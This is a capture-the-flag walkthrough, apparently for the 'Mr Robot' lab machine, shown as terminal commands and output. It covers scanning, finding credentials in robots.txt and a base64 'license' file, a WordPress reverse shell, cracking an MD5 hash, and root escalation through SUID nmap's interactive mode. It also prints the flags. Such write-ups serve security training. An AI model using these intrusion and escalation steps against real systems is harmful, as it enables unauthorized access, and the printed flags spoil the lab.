## nmap -sVC -A 10.10.158.168 -Pn
```bash
Nmap scan report for 10.10.158.168
Host is up (0.37s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
Device type: general purpose|specialized|storage-misc|WAP|printer
Running (JUST GUESSING): Linux 5.X|3.X|4.X|2.6.X (92%), Crestron 2-Series (89%), HP embedded (89%), Asus embedded (88%)
OS CPE: cpe:/o:linux:linux_kernel:5.4 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:crestron:2_series cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:asus:rt-n56u cpe:/o:linux:linux_kernel:3.4
Aggressive OS guesses: Linux 5.4 (92%), Linux 3.10 - 3.13 (91%), Linux 3.10 - 4.11 (90%), Linux 3.12 (90%), Linux 3.13 or 4.2 (90%), Linux 3.2 - 3.5 (90%), Linux 3.2 - 3.8 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Crestron XPanel control system (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   232.76 ms 10.2.0.1
2   ... 3
4   370.12 ms 10.10.158.168
```
## 10.10.158.168/robots.txt
```bash
User-agent: *
fsocity.dic
key-1-of-3.txt
```
## curl http://10.10.158.168/key-1-of-3.txt
```bash
073403c8a58a1f80d943455fb30724b9
```
## dirbuster with fsocity.dic
```bash
license 200
wp-login 200
```
## curl http://10.10.158.168/license
```bash
ZWxsaW90OkVSMjgtMDY1Mgo=
elliot:ER28-0652
```
## login to wp, rev shell
```bash
$ whoami
daemon
$ cd /home
$ dir
robot
$ cd robot
$ ls -l
total 8
-r-------- 1 robot robot 33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot 39 Nov 13  2015 password.raw-md5
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```
## crack the hash 
```bash
c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
```
## pimp the shell
```bash
$ python -c 'import pty;pty.spawn("/bin/bash")'
```
## su robot
```bash
daemon@linux:/home/robot$ su robot
su robot
Password: abcdefghijklmnopqrstuvwxyz

robot@linux:~$ cat /home/robot/ke	
cat /home/robot/key-2-of-3.txt 
822c73956184f694993bede3eb39f959
```
## Privilege Escalation
```bash
robot@linux:/$ find / -perm -u=s -type f 2>/dev/null
```
```bash
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/pt_chown
```
```bash
robot@linux:/$ nmap --interactive
```
```bash
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !ls /root
!ls /root
firstboot_done	key-3-of-3.txt
waiting to reap child : No child processes
nmap> !cat /root/key-3-of-3.txt
!cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```
